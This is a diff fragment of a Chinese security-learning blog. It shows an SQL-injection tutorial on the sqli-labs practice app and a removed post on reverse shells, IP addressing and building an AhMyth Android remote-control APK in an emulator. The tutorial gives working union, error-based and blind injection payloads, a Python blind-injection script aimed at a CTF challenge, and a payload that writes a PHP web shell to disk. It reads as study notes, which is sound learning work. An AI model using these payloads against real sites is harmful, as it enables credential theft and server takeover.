+<p><strong>字符型注入点</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">select * from 表名 where name=&#x27;admin&#x27; and 1=1 &#x27;&#x27;</span><br><span class="line"># 字符型常见的注入语句(Payload)</span><br><span class="line"></span><br><span class="line"># 后台语句 - SELECT * FROM users WHERE id=(&#x27;$id&#x27;) LIMIT 0,1</span><br><span class="line">id=-1&#x27;) union select 1,database(),version() --+</span><br><span class="line">id=-2&quot;) union select 1,2,3--+</span><br></pre></td></tr></table></figure>
+
+<p>判断是哪种注入时需要使用叫脚本或工具或者直接在网页上进行注入</p>
+<p>postman便是一个很好的工具</p>
+<p>判断注入类型需要先输入？id&#x3D;1，？后面的内容根据具体网站而定</p>
+<p>通过输入的变量不同看网站输出的数据</p>
+<p>&#x2F;sqli&#x2F;Less-1&#x2F;?id&#x3D;1</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231223190414824.png" alt="image-20231223190414824"></p>
+<p>&#x2F;sqli&#x2F;Less-1&#x2F;?id&#x3D;2</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231223190546590.png" alt="image-20231223190546590"></p>
+<p>&#x2F;sqli&#x2F;Less-1&#x2F;?id&#x3D;1’（加了个单引号）</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231223190647546.png" alt="image-20231223190647546"></p>
+<p>页面报错，加个注释试试</p>
+<p>&#x2F;sqli&#x2F;Less-1&#x2F;?id&#x3D;1’– -</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231223190834434.png" alt="image-20231223190834434"></p>
+<p>内容又重新显示出来了，表示这是字符型且存在漏洞</p>
+<h5 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h5><p>查询列数</p>
+<p>如果报错就是超过列数，如果显示正常就是没有超出列数。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;order by 3 --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231223191219280.png" alt="image-20231223191219280"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/sqli/Less-1/?id=1&#x27;order by 4 --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231223191328522.png" alt="image-20231223191328522"></p>
+<p>报错了，说明列数是三行</p>
+<p>爆显示位</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,2,3--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231223191524742.png" alt="image-20231223191524742"></p>
+<p>id为-1的原因</p>
+<ol>
+<li><p>作为数字使用而不是字符串</p>
+</li>
+<li><p>绕过语法限制如表名限制</p>
+</li>
+<li><p>利用错误或延时进行盲注</p>
+</li>
+<li><p>测试是否支持联合查询</p>
+</li>
+<li><p>长度限制等原因</p>
+</li>
+</ol>
+<p>查MySQL版本号</p>
+   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,database(),version()--+</span><br></pre></td></tr></table></figure>
+
+<p>   <img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231223191903868.png" alt="image-20231223191903868"></p>
+<p><strong>爆表</strong>（*）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/sqli/Less-1/?id=-1&#x27;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br></pre></td></tr></table></figure>
+
+<p>就是告诉我们这个库有哪些表</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231223192128997.png" alt="image-20231223192128997"></p>
+<p>我们需要的一般是users表内内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231223192258777.png" alt="image-20231223192258777"></p>
+<p>id，username，password是我们需要的内容</p>
+<p>可以直接查询user表中内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/sqli/Less-1/?id=-1&#x27; union select 1,2,group_concat(username ,id , password) from users--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231223192430675.png" alt="image-20231223192430675"></p>
+<p>我们需要的内容就出现了</p>
+<h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 &#x27;and (extractvalue(1,concat(0x7e,(select user()),0x7e)))-- -</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">(select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)</span><br><span class="line"></span><br><span class="line">(extractvalue(1,concat(0x7e,(select user()),0x7e)))</span><br><span class="line"></span><br><span class="line">(updatexml(1,concat(0x7e,(select user()),0x7e),1))</span><br><span class="line"></span><br><span class="line">geometrycollection((select * from(select * from(select user())a)b))</span><br><span class="line"></span><br><span class="line">multipoint((select * from(select * from(select user())a)b))</span><br><span class="line"></span><br><span class="line">polygon((select * from(select * from(select user())a)b))</span><br><span class="line"></span><br><span class="line">multipolygon((select * from(select * from(select user())a)b))</span><br><span class="line"></span><br><span class="line">linestring((select * from(select * from(select user())a)b))</span><br><span class="line"></span><br><span class="line">multilinestring((select * from(select * from(select user())a)b))</span><br><span class="line"></span><br><span class="line">exp(~(select * from(select user())a))</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h4><p>盲注又可以分为布尔盲注和时间盲注。</p>
+<h5 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h5><p>该语句很重要，可以通过它来判断数据库中每个字符，通过ascii字符来判断。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27;and ascii(substring(database(),1,1))=115--+</span><br></pre></td></tr></table></figure>
+
+<p>盲注python脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#id=1&#x27;and ascii(substring(database(),1,1))=115--+</span><br><span class="line">import requests</span><br><span class="line">session = requests.Session()</span><br><span class="line"># url = &quot;http://192.168.2.70/sqli/Less-8/?id=1&#x27;&quot;</span><br><span class="line">def erfen(url):</span><br><span class="line"> name = &quot;&quot;</span><br><span class="line"> for i in range(1,100):</span><br><span class="line">  a = int(32)</span><br><span class="line">  b = int(128)</span><br><span class="line">  d = (a + b)//2</span><br><span class="line">  while a &lt; b :</span><br><span class="line">   Get = url + &quot;/**/and/**/ascii(substr((select group_concat(id,username,password) from ctfshow_user4 where username=&#x27;flag&#x27;),&#123;0&#125;,1))&gt;&#123;1&#125;-- -&quot;.format(i,d)</span><br><span class="line">   res = session.get(Get)</span><br><span class="line">   if &#x27;&#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;admin&quot;&#125;&#x27; in res.text:</span><br><span class="line">    a = d + 1</span><br><span class="line">    d = (a + b)//2</span><br><span class="line">   else:</span><br><span class="line">    b = d</span><br><span class="line">    d = (a + b)//2</span><br><span class="line">  if d == 32:</span><br><span class="line">   break</span><br><span class="line">  name += chr(d)</span><br><span class="line">#  return name</span><br><span class="line">  print(name)</span><br><span class="line"># erfen()</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line"> url = &quot;http://4cd4bfb2-24b0-4483-83bf-bad37a9a29b5.challenge.ctf.show/api/v4.php?id=1&#x27;&quot;</span><br><span class="line"> name = erfen(url)</span><br><span class="line">#  print(name)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231223193000982.png" alt="image-20231223193000982"></p>
+<h5 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h5><p>​	时间盲注又称延迟注入，适用于页面不会返回错误信息，只会回显一种界面，其主要特征是利用sleep函数让mysql执行时间变长，制造时间延迟，通过页面的响应时间来判断条件是否正确。通常与if(expr1,expr2,expr3)语句结合使用（如果expr1是True，则返回expr2，否则返回expr3）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 判断闭合符号：由于页面无法返回正确或错误的值，所以只能通过if加sleep函来判断闭合</span><br><span class="line">?id=1&#x27; and if(1=2, 1, sleep(3))--+        # 判断是否是单引号闭合，如果是页面会延迟响应3秒</span><br><span class="line">?id=1&quot; and sleep(3)--+                    # 也可以直接使用and拼接sleepl来判断</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 常见的注入语句(Payload)</span><br><span class="line">?id=1&#x27; and if(length(database())&gt;8, sleep(2), 0) --+               # 判断数据库名长度</span><br><span class="line">?id=1&#x27; and if(ascii(substr(database(),1,1))=115,sleep(2),0) --+    # 通过ASCII码，判断数据库的第一个字母，然后通过改变截取的字符，进一步判断库名</span><br><span class="line"># 判断表名</span><br><span class="line">?id=1&#x27; and if(ascii(substr((select table_name from information_schema.tables where table_schema=&quot;security&quot; limit 0,1),1,1))=101,sleep(2),0) --+</span><br><span class="line"># 判断列名</span><br><span class="line">?id=1&#x27; and if(ascii(substr((select column_name from information_schema.columns where table_name=&quot;users&quot; and table_schema=database() limit 0,1),1,1))=105,sleep(2),1) --+</span><br></pre></td></tr></table></figure>
+
+<p><strong>时间盲注python中判断是否延时的语句，延时则表示字串正确</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> time.time()-ss&gt;=<span class="number">4</span>:</span><br><span class="line">    flag += i</span><br><span class="line">    <span class="built_in">print</span> (flag)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,@@datadir,@@secure_file_priv -- -</span><br></pre></td></tr></table></figure>
+
+<p>输入该语句可以查询数据库内容放置位置</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231223193846084.png" alt="image-20231223193846084"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,@@datadir,&quot;&lt;?php @system($_GET[a]);  ?&gt;&quot; into outfile &quot;地址&quot; -- -</span><br></pre></td></tr></table></figure>
+
+<p>地址内斜杠需要用双斜杠代替，不然内容传输不过去。</p>
+<h4 id="sql注入工具"><a href="#sql注入工具" class="headerlink" title="sql注入工具"></a>sql注入工具</h4><h2 id="重要语句"><a href="#重要语句" class="headerlink" title="重要语句"></a>重要语句</h2><p>?id&#x3D;1</p>
+<p>?id&#x3D;1’– -</p>
+<p>?id&#x3D;1’order by 3– -</p>
+<p>?id&#x3D;-1’union select 1,2,3–+</p>
+<p>?id&#x3D;-1’union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’–+</p>
+<p>?id&#x3D;-1’union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’–+</p>
+<p>?id&#x3D;-1’ union select 1,2,group_concat(username ,id , password) from users–+</p>
+<p>id&#x3D;1’and ascii(substring(database(),1,1))&#x3D;115–+（判断字符语句）</p>
 
       
     </div>
@@ -2292,199 +2664,6 @@
 </li>
 <li><p>SSL&#x2F;TLS 过滤规则：可以使用 ssl 或 tls 关键字来过滤 SSL&#x2F;TLS 加密的数据包。</p>
 <p>&#x27A4;例如，ssl.handshake.type &#x3D;&#x3D; 1 可以过滤出 SSL 握手类型为 Client Hello 的数据包。</p>
-</li>
-</ol>
-
-      
-    </div>
-  </div>
- 
-</article>
-
-
-  
-    <article id="post-2.1-正反shell讲解-jdk的安装-学习规章-IP讲解-IP分类" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2023/12/04/2.1-%E6%AD%A3%E5%8F%8Dshell%E8%AE%B2%E8%A7%A3-jdk%E7%9A%84%E5%AE%89%E8%A3%85-%E5%AD%A6%E4%B9%A0%E8%A7%84%E7%AB%A0-IP%E8%AE%B2%E8%A7%A3-IP%E5%88%86%E7%B1%BB/">2.1 正反shell讲解/jdk的安装/学习规章/IP讲解/IP分类</a>
-    </h1>
-  
-
-        <div class="article-meta">
-          <a href="/2023/12/04/2.1-%E6%AD%A3%E5%8F%8Dshell%E8%AE%B2%E8%A7%A3-jdk%E7%9A%84%E5%AE%89%E8%A3%85-%E5%AD%A6%E4%B9%A0%E8%A7%84%E7%AB%A0-IP%E8%AE%B2%E8%A7%A3-IP%E5%88%86%E7%B1%BB/" class="article-date">
-  <time datetime="2023-12-04T01:06:56.000Z" itemprop="datePublished">2023-12-04</time>
-</a>
-          
-          
-        </div>
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h5 id="网络安全相关网站："><a href="#网络安全相关网站：" class="headerlink" title="网络安全相关网站："></a>网络安全相关网站：</h5><p>cve、cnvd(<a target="_blank" rel="noopener" href="http://www.cnvd.org.cn)、cnnvd/">www.cnvd.org.cn)、cnnvd</a></p>
-<h3 id="正反shell讲解"><a href="#正反shell讲解" class="headerlink" title="正反shell讲解"></a>正反shell讲解</h3><p>信息连接：（server：服务端，client：客户端）</p>
-<p>s&lt;-c:反弹shell，反连</p>
-<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231204112748363.png" alt="image-20231204112748363"></p>
-<p>server端发一个能监听自身0.0.0.0：8888端口的马给clint端，服务器端接收马后持续发信息给s的0.0.0.0：8888端口信息</p>
-<p>s-&gt;c:正向shell</p>
-<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231204112652158.png" alt="image-20231204112652158"></p>
-<p>server端发一个马到clint端，获取c的ip—0.0.0.0：8888，server通过监听0.0.0.0：8888来获取数据，但是获取期间需要透过防火墙来获取信息。（0.0.0.0代表任意ip）</p>
-<p>综上所述，一般的远控一般都是反向shell</p>
-<hr>
-<h3 id="jdk的安装："><a href="#jdk的安装：" class="headerlink" title="jdk的安装："></a>jdk的安装：</h3><h5 id="jdk的下载"><a href="#jdk的下载" class="headerlink" title="jdk的下载"></a>jdk的下载</h5><p>官网下载地址：<a target="_blank" rel="noopener" href="https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html">https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html</a></p>
-<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/fcde92c99eb54b39bf1ab983a1f035ea.png" alt="img">双击点击安装，jdk安装路径可以自行安装，但是尽量选择原路径。</p>
-<h5 id="文件说明"><a href="#文件说明" class="headerlink" title="文件说明"></a>文件说明</h5><p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231204172854467.png" alt="image-20231204172854467"></p>
-<p>bin：提供 JDK 工具程序，包括 javac、java、javadoc、appletviewer 等可执行程序。</p>
-<p>include：存放用于本地访问的文件。</p>
-<p>jre：存放 Java 运行环境文件。</p>
-<p>lib：存放 Java 的类库文件，工具程序实际上使用的是 Java 类库。JDK 中的工具程序，大多也由 Java 编写而成。</p>
-<p>src.zip：Java 提供的 API 类的源代码压缩文件。如果需要查看 API 的某些功能是如何实现的，可以査看这个文件中的源代码内容。</p>
-<h5 id="测试jdk"><a href="#测试jdk" class="headerlink" title="测试jdk"></a>测试jdk</h5><p>开始-&gt;运行-&gt;cmd</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -version</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231204173037964.png" alt="image-20231204173037964"></p>
-<p>根据版本不同，显示的数字也不同，</p>
-<h5 id="配置环境变量"><a href="#配置环境变量" class="headerlink" title="配置环境变量"></a>配置环境变量</h5><p>右键此电脑-&gt;属性-&gt;高级系统设置-&gt;环境变量</p>
-<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231204173432571.png" alt="image-20231204173432571"></p>
-<p>在系统变量中新建一个变量</p>
-<p>变量名为  JAVA_HOME  ,变量值为%JAVA_HOME8%，数字8应该为你用的jdk版本，如果以后安装更多的jdk只需要更改%JAVA_HOME8%中的数字。</p>
-<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231204173841960.png" alt="image-20231204173841960"></p>
-<p>在系统变量中新建一个变量</p>
-<p>变量名为  JAVA_HOME8,变量值为jdk版本所在文件位置，安装更多的jdk只需要新建更多的系统变量，变量名应为JAVA_HOME+版本号，变量值为jdk所在位置</p>
-<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231204173857861.png" alt="image-20231204173857861"></p>
-<p>在系统变量中双击Path</p>
-<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231204174313578.png" alt="image-20231204174313578"></p>
-<p>分别新建两个内容，填上：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%JAVA_HOME%\jre\bin</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231204174515527.png" alt="image-20231204174515527"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%JAVA_HOME%\bin</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231204174502069.png" alt="image-20231204174502069"></p>
-<p>jdk就正式安装成功了。</p>
-<hr>
-<h3 id="学习推荐"><a href="#学习推荐" class="headerlink" title="学习推荐"></a>学习推荐</h3><p>Python的代码推荐使用vscode</p>
-<p>vscode推荐的插件：code run、Python</p>
-<hr>
-<h3 id="学习规章："><a href="#学习规章：" class="headerlink" title="学习规章："></a>学习规章：</h3><p>1.文件名、文件目录不能是中文</p>
-<p>2.文件夹命名空格以“_”做代替</p>
-<p>3.遇到报错以管理员身份运行</p>
-<p>4.文件命名驼峰命名法</p>
-<p>5.应用不要装C盘</p>
-<p>6.卸载软件不能直接删文件夹，使用geek卸载</p>
-<p>7.每天写笔记</p>
-<p>8.早晚打卡</p>
-<p>9.请假在企业微信</p>
-<p>10.每个知识点有提高部分（隐藏）</p>
-<p>11.作息时间：9:00-11:30   14:00-17:30    19:00-21:00</p>
-<hr>
-<h3 id="IP讲解"><a href="#IP讲解" class="headerlink" title="IP讲解"></a>IP讲解</h3><p>windows系统查询ip地址-cmd输入</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231204155515239.png" alt="image-20231204155515239"></p>
-<p>ipv4每个位置命名</p>
-<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231210143928904.png" alt="image-20231210143928904"></p>
-<p>每个位置的最大可用地址为254即254.254.254.254，最大位置为255即255.255.255.255</p>
-<p>d位.1表示网关，.255表示广播地址。</p>
-<p>192.168.1.0是网络地址，192.168.168.255是广播地址。</p>
-<p>192.168.1.1是一个IP地址。</p>
-<p>具体来说:</p>
-<ul>
-<li>192.168.1.1是一个私有IP地址,它属于192.168.0.0&#x2F;16网段内部的地址。</li>
-<li>192.168.1.1符合IPv4地址格式,共分为4段数字,每段范围在0-255之间。</li>
-<li>根据不同的上下文,192.168.1.1可以代表不同的地址类型:<ul>
-<li>如果是单独的主机,那么它就是这个主机的IP地址。</li>
-<li>如果是子网,那么它可能是:<ul>
-<li>子网的网络地址(很少情况)</li>
-<li>子网内第一个可用的主机地址</li>
-<li>子网的网关地址,路由器或交换机的IP地址</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>一般来说,192.168.1.1最常见的情况是作为子网内第一个可用地址分配,也常作为子网的默认网关地址。</li>
-</ul>
-<p>所以总结来说,192.168.1.1是一个私有IP地址,它可能代表单独主机的IP,也可能是子网内第一个地址或默认网关地址。</p>
-<p>192.168.1.1&#x2F;30是一个子网掩码为30位的子网。</p>
-<p><em>子网掩码</em>30位,表示:</p>
-<ul>
-<li>网络地址部分:192.168.1.0</li>
-<li>主机地址部分:2位(2^2&#x3D;4个地址)</li>
-</ul>
-<p>所以该子网可以分配的IP地址有:</p>
-<ul>
-<li>网络地址:192.168.1.0</li>
-<li>广播地址:192.168.1.3</li>
-<li>可用主机地址:192.168.1.1、192.168.1.2</li>
-</ul>
-<p>总共可以分配2个IP地址给主机使用。</p>
-<p>所以答案是:192.168.1.1&#x2F;30子网可以分配2个主机IP地址。</p>
-<p>a有8位，b有8位，c有8位，d应该有8位a+b+c+d&#x3D;32</p>
-<p>192.168.1.1&#x2F;30 8+8+8+6&#x3D;30,32-30&#x3D;2,主机地址有两位（2^两&#x3D;4个地址），分别减去网络地址(192.168.1.0)和广播地址(192.168.1.3)，可用地址剩下的是192.168.1.1、192.168.1.2</p>
-<p>192.168.1.0不是一个合法的IP地址,它是网络地址,不能直接作为主机或网关使用。</p>
-<p>正确的情况是:</p>
-<ul>
-<li>网络地址: 192.168.1.0</li>
-<li>第一个可用主机地址: 192.168.1.1</li>
-<li>网关地址: 192.168.1.1</li>
-</ul>
-<p>理由如下:</p>
-<ul>
-<li>在IP地址分配中,网络地址是不可用的,它只表示子网本身。</li>
-<li>根据地址分配规则,第一个可用地址应该是网络地址加1,也就是192.168.1.1。</li>
-<li>网关地址一般设置为第一个可用主机地址,也就是192.168.1.1,以便路由转发。</li>
-</ul>
-<p>所以您指出的正确,192.168.1.0是网络地址,不应该作为主机或网关使用。网关地址应该是第一个可用主机地址192.168.1.1。</p>
-<hr>
-<h3 id="IP分类"><a href="#IP分类" class="headerlink" title="IP分类"></a>IP分类</h3><p>一般电脑ip地址一般是在A类、B类、C类，D类和E类是用于科研，一般人用不到。</p>
-<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231204163601268.png" alt="image-20231204163601268"></p>
-<p>私网IP：</p>
-<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/b0fd8be3d569103b9a790edfa87d7f4.png" alt="b0fd8be3d569103b9a790edfa87d7f4"></p>
-<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231210144238867.png" alt="image-20231210144238867"></p>
-<p>正常信息传输过程。</p>
-<hr>
-<h3 id="Android远控"><a href="#Android远控" class="headerlink" title="Android远控"></a>Android远控</h3><ol>
-<li><p>下载AhMyth_Win64.exe，直接双击文件安装</p>
-</li>
-<li><p>出现该图标表示安装成功</p>
-<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231210122540284.png" alt="image-20231210122540284"></p>
-</li>
-<li><p>运行cmd命令窗口，输入ipconfig查询本机ip</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231210122648617.png" alt="image-20231210122648617"></p>
-</li>
-<li><p>右键管理员运行</p>
-<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231210122735857.png" alt="image-20231210122735857"></p>
-</li>
-<li><p>点击APK Builder，在Source IP输入本机ip</p>
-<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231210122857418.png" alt="image-20231210122857418"></p>
-</li>
-<li><p>点击Build,创建apk</p>
-</li>
-<li><p>报错</p>
-<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231210123050445.png" alt="image-20231210123050445"></p>
-</li>
-<li><p>切换系统仍然报错（win10,虚拟机win10,虚拟机win7）</p>
-</li>
-<li><p>在win10虚拟机中配置jdk8成功生成apk</p>
-<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231210173122039.png" alt="image-20231210173122039"></p>
-</li>
-<li><p>将其安装到模拟器中，模拟器运行apk后点击listen</p>
-<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231210173341273.png" alt="image-20231210173341273"></p>
-</li>
-</ol>
-<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231210173445837.png" alt="image-20231210173445837"></p>
-<ol start="11">
-<li><p>点击open the lab</p>
-</li>
-<li><p>后续可执行任务</p>
-<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231210173554867.png" alt="image-20231210173554867"></p>
 </li>
 </ol>
 
